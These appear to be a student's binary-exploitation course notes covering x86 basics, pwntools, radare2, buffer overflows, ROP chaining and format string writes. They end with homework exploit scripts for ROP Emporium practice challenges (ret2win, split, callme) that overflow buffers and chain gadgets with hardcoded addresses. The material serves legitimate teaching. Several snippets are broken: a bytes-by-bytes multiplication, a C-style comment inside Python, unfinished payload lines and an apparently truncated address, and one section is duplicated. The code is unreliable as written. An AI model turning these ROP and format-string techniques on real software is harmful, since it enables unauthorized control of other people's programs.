# 676 Notes
## Table of Contents
_________
* [Useful Things to Know](#Useful-Things-to-Know)
* [x86](#x86)
* [pwntools](#pwntools)
* [Radare2](#Radare2)
* [Buffer Overflow](#Buffer-Overflow)
* [Assembly](#Assembly)
* [ROP Chaining](#ROP-Chaining)
* [GOT PLT Linking & Exploiting](#GOT-PLT-Linking-&-Exploiting)
* [String Format Vulnerabilities](#String-Format-Vulnerabilities)
* [Homeworks](#Homeworks)

## Useful Things to Know
_________
#### Tmux:
* Start Tmux with `tmux`
* `ctrl + B + %` to split the screen
* `ctrl + B + O` to switch between panes
* Full list of instructions [here](https://tmuxcheatsheet.com/)

## x86
______________________________________________________
#### Registers (e-- is 32-bit, r-- is 64-bit)
| Register | 64-bit | 32-bit | Purpose |
| :--: | :--: | :--: | :--: | 
| Accumulator | rax | eax | I/0 access, arithmetic, interrupt calls |
| Counter | rcx | ecx | Loop counter |
| Data | rdx | edx | I/O port access, arithmetic |
| Base | rbx | ebx | Base pointer for memory access |
| Stack Pointer | rsp | esp | Holds the top address of the stack |
| Stack Base Pointer | rbp | ebp | Hold base address of the stack |
| Source | rsi | esi | String and memory array copying |
| Destination | rdi | edi | String and memory array copying

## pwntools
____________________
* To enter the interactive terminal type `ipython3`
* First line of code should always be `from pwn import *`
* When cracking into an executable: `p = process("filename")`
* When cracking into a remote server: `p = remote("ip", port_number)`
* Use `p.recv()` to show anything that the executable is printing
* Use `p.sendline()` or `p.send()` to send the payload
* Use `elf = ELF("filename")` to get any important information about the executable
    - Use `elf.got` to get the values inside of the GOT

## Radare2
_________
* Look at the assembly of an executable using `r2 -Ad filename`
    - `s function_name` or `s memory_address`
        * usually use `s main`
    - `Vpp` to see the code
    - `:db address` to set a breakpoint
        - `:dc` to continue

## Buffer Overflow
_____________
* This is used to overrwrite existing local variables
* WHEN TO USE: if gets is used to get data in the executable 
* Find the local variable that you want to overwrite using r2 (it will look like `var int64_t var_20h @ rbp-0x20`)
* Add 4 bytes in 32-bit and 8 bytes in 64-bit for return address

## Assembly
_______________
* Perform syscalls using int 0x80
* Full list of syscalls [here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)
* eax is the type of syscall
* Arguments go ebx, ecx, edx, esi, edi, ebp in that order

## ROP Chaining
___________________
#### All relevant instructions and the order to use them in:
1. Use `file filename` to see what type of file it is, how it was compiled, and whether it was stripped
    * If file is not stripped:
        * Use `rabin2 -s filename` to see all of the functions and their locations inside of the executable
        * Use `rabin2 -z filename` to see all of the strings and their locations inside of the executable
2. Use `checksec filename` to see possible vulnerabilities
3. Use `r2 -Ad filename` to get any necessary function and argument locations
4. Use ` ROPgadget --binary filename | grep pop` to get a `pop; ret` statement
    * The number of pop statements depends on the number of arguments, 3 args = 3 pops
    
#### Application:
* 32-bit:
    ```python
    from pwn import *
    offset = 44 # it's usually 44, but it might not be
    function_address = ___
    pop_address = ___
    argument = ___
    inject = b"a" * p32(offset) + p32(function_address) + p32(pop_address) + p32(argument)
    ```
* 64-bit:
    ```python
    from pwn import *
    offset = 40 # it's usually 40, but it might not be
    function_address = ___
    pop_address = ___
    argument = ___
    inject = b"a" * p64(offset) + p64(pop_address) + p64(argument) + p64(function_address)
    ```
## GOT PLT Linking & Exploiting
_________
All relevant instructions and the order to use them in:
1. Use `ldd filename` to get the location of libc (will look like `libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6`)

## String Format Vulnerabilities
___
#### When to Use:
* When asked for input type `%p`, if something other than `%p` shows up, there is a printf vulnerability

#### How to Use:
##### 32-bit:
1. Start with `%1$p`, `%2$p`, and continue until you see the hex value for what you input (if you input )
2. Do `inject = p32(target_address)`
3. Increase the size of what gets printed by using `%Sx` where S is the number of spaces to add (x is just the letter x)
4. Write the width of the injection to the target as bytes
    * Assuming N is the argument number:
        * 1 byte: `%N$hhn`
        * 2 bytes: `%N$hn`
        * 4 bytes: `%N$n`
        * 8 bytes: `%N$lln`
* Payload will look like:
```python
from pwn import *
inject = p32(target_address) + b"%Sx" + b"%N$hhn" # S = number of spaces to add, N = argument number
```

##### 64-bit:

## Homeworks
_________
#### (C) Write code that generates a number from 1 to 6
```C
#include <stdlib.h> // rand and srand
#include <time.h> // time 
#include <stdio.h> // printf

int main()
{
  srand(time(NULL));
  int rand_num = (rand() % 6) + 1;
  printf("%d \n", rand_num);
  return 0;
}
```
#### (C) Write code that can take in a string of any length and print it
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void) {
  char letter; // individual letter of string
  char* str = (char*)malloc(sizeof(char*) * 10); // start off with a small string
  int count = 0; // keeps track of where in string it is

  while((letter = getchar()) != '\n') // set current letter and use new line as the exit condition
  {
    if (count >= 10) { // if the string is larger than what was allocated
      str = (char*)realloc(str, count+1); // reallocate to 1 larger
    }
    *(str+count) = letter; // add letter to the string
    count++;
  }
  printf("\nText: %s\nLength: %lu\n", str, strlen(str));
  free(str); 
  return 0;
}
```
#### (C++) Import a library from github and use it to do something
```cpp
#include <iostream>
#include <Eigen/Dense>

using Eigen::MatrixXd;
using namespace std;

int main()
{
  MatrixXd m(5,5);
  m << MatrixXd::Random(5,5);

  Eigen::VectorXcd evals = m.eigenvalues();

  cout << "The matrix:\n" << m << "\n" << endl
       << "The diagonals:\n" << m.diagonal() << "\n" << endl
       << "The determinant:\n" << m.determinant() << "\n" << endl
       << "The inverse:\n" << m.inverse() << "\n" << endl
       << "The eigenvalues:\n" << evals << "\n" << endl;
}
```
#### (Python) Write a script to crack this [github code](https://gist.github.com/AndyNovo/d4b90e1286aa41ead58f51997c08a0f0)
```python
from pwn import *
from Crypto.Util.number import *

def to_bytes(op, val)->bytes:
    if (op == "integer"):
        return long_to_bytes(val)
    elif (op == "string"):
        return val
    elif (op == "hexdigest"):
        return long_to_bytes(int(bytes(val), 16))
    elif (op == "bytearray"):
        return [int(i) for i in str(val)[2:-1].strip("][").split(", ")]

def main()->int:
    p = remote("ip", 8888)
    count = 0
    for i in range(100):
        s = p.recvuntil(b'@@@@@', timeout=10)
        
        values = {}
        values[s[s.find(b'g: ')+3:s.find(b"format1")-2]] = s[s.find(b"format1")+8:s.find(b"AND")-2]
        values[s[s.find(b'AND')+4:s.find(b"format2")-2]] = s[s.find(b"format2")+8:s.find(b"@@@@@")-2]
        
        arr = []

        for key in values:
            arr.append(to_bytes(str(values[key])[2:-1], key))

        answer = xor(arr[0], arr[1])
        count += 1
        print(f"{count}: {str(answer)[2:-1]}")
        p.sendline(str(answer)[2:-1])

    return 0

main()
```
#### (Python) Solve [bufover-2](https://gist.github.com/AndyNovo/5810254a0a8c2cf4b369d60732db77f7)
#### (x86) Code something cool that uses syscall in x86 32-bit 
``` assembly
;; Makes new directory
section .text:
    global _start

_start:
    xor ebx, ebx
    push ebx
    push 0x72694477
    push 0x656e2f2e
    mov ebx, esp

    mov eax, 0x27 
    int 0x80 
    
    xor ebx, ebx
    mov eax, 1
    int 0x80
```
#### (x_86 & x86_64) Write code that takes in a string and performs caesar encryption on it
##### x86
```assembly
section .text:
    global _start

_start:
    
    mov esi, [esp+8]
    mov edx, -1
    loop1:
        inc edx
        add byte [esi + edx], 1
        cmp byte [esi + edx], 0x01
        jne loop1
    
    mov ebx, 1
    mov ecx, [esp+8]
    
    mov eax, 0x04
    int 0x80    

    xor ebx, ebx
    mov eax, 0x01
    int 0x80
```
##### x86_64
```assembly
global _start
section .text

_start:
    mov rsi, [rsp + 0x10]
    mov rdx, -1
    loop:
        inc rdx 
        add byte [rsi + rdx], 1
        cmp byte [rsi + rdx], 0x01
        jne loop
    
    mov rdi, 1
    mov rax, 0x01
    syscall
    
    xor rdi, rdi
    mov rax, 0x3c
    syscall
```
#### (Python) Make script to crack [ret2win](https://ropemporium.com/challenge/ret2win.html) in 32-bit and 64-bit
##### 32-bit:
```python
from pwn import *
inject = b"a" * 44 + 
p = process("./ret2win32")
p.sendline(inject)
p.recv()
```
##### 64-bit:
```python
from pwn import *
inject = b"a" * 40 + 
p = process("./ret2win")
p.sendline(inject)
p.recv()
```
(Python) Create an exploit to crack this
#### (Python) Make script to crack [split](https://ropemporium.com/challenge/split.html) & [callme](https://ropemporium.com/challenge/callme.html) in 32-bit & 64-bit
##### 32-bit split:
```python
from pwn import *

inject = b"a" * 44 + p32(0x080483e0) + p32(0x080486b) + p32(0x0804a030)
p = process("./split32")
p.sendline(inject)
p.recv()

```
##### 64-bit split:
```python
from pwn import *

inject = b"a" * 40 + p64(0x00000000004007c3) + p64(0x00601060) + p64(0x00400560)
p = process("./split")
p.sendline(inject)
p.recv()
```
##### 32-bit callme:
```python
from pwn import *

offset = 44 # starting offset
pop = 0x080487f9 # pop esi; pop edi; pop ebp; ret # 3 pops for 3 args
funcs = (0x080484f0, 0x08048550, 0x080484e0) # function locations
args = (0xdeadbeef, 0xcafebabe, 0xd00df00d) # arguments (given in problem)
inject = b"a" * offset # start by filling out the offset
for function in funcs:
    inject += p32(function) # add the function
    inject += p32(pop) // pop the arguments
    for argument in args:
        inject += p32(argument) # add the arguments

p = process("./callme32")
p.recv()
p.sendline(inject)

```
##### 64-bit callme:
```python
from pwn import *

offset = 40 #starting offset
pop = 0x000000000040093c # pop rdi; pop rsi; pop rdx; ret # 3 pops for 3 args
funcs = (0x00400720, 0x00400740, 0x004006f0) # function locations
args = (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) # arguments (given in problem)
inject = b"a" * offset # start by filling out the offset
for function in funcs:
    inject += p64(pop) # pop the arguments
    for argument in args:
        inject += p64(argument) # add the arguments
    inject += p64(function) # add the function

p = process("./callme")
p.recv()
p.sendline(inject)
```
#### (Python) Make script to crack [split](https://ropemporium.com/challenge/split.html) & [callme](https://ropemporium.com/challenge/callme.html) in 32-bit & 64-bit
##### 32-bit split:
```python
from pwn import *

inject = b"a" * 44 + p32(0x080483e0) + p32(0x080486b) + p32(0x0804a030)
p = process("./split32")
p.sendline(inject)
p.recv()

```
##### 64-bit split:
```python
from pwn import *

inject = b"a" * 40 + p64(0x00000000004007c3) + p64(0x00601060) + p64(0x00400560)
p = process("./split")
p.sendline(inject)
p.recv()
```
##### 32-bit callme:
```python
from pwn import *

offset = 44 # starting offset
pop = 0x080487f9 # pop esi; pop edi; pop ebp; ret # 3 pops for 3 args
funcs = (0x080484f0, 0x08048550, 0x080484e0) # function locations
args = (0xdeadbeef, 0xcafebabe, 0xd00df00d) # arguments (given in problem)
inject = b"a" * offset # start by filling out the offset
for function in funcs:
    inject += p32(function) # add the function
    inject += p32(pop) // pop the arguments
    for argument in args:
        inject += p32(argument) # add the arguments
p = process("./callme32")
p.recv()
p.sendline(inject)
```
##### 64-bit callme:
```python
from pwn import *

offset = 40 #starting offset
pop = 0x000000000040093c # pop rdi; pop rsi; pop rdx; ret # 3 pops for 3 args
funcs = (0x00400720, 0x00400740, 0x004006f0) # function locations
args = (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) # arguments (given in problem)
inject = b"a" * offset # start by filling out the offset
for function in funcs:
    inject += p64(pop) # pop the arguments
    for argument in args:
        inject += p64(argument) # add the arguments
    inject += p64(function) # add the function

p = process("./callme")
p.recv()
p.sendline(inject)
```
